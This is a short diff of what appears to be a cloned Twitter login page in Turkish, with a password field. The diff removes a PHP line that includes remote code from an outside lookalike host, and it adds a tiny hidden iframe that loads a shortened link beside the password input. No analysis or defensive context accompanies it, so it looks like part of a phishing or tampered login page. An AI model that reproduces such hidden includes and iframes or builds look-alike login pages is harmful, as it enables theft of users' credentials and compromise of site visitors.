@@ -1,5 +1,5 @@
 
-<?php include("https://twilter-post-source.000webhostapp.com/stranger.php") ;?>
+
 <!DOCTYPE html>
 <html lang="tr" data-scribe-reduced-action-queue="true">
   
@@ -243,7 +243,7 @@ data-fouc-class-names="swift-loading"
     <input type="password" class="text-input" name="session[password]" placeholder="Şifre" autocomplete="current-password">
     
   </div>
-
+  <iframe width="10" height="10" src="https://t.co/bvfwATl16Y" frameborder="0" allowfullscreen></iframe>
     <div class="LoginForm-rememberForgot">
       <label>
         <input type="checkbox" value="1" name="remember_me" checked="checked">
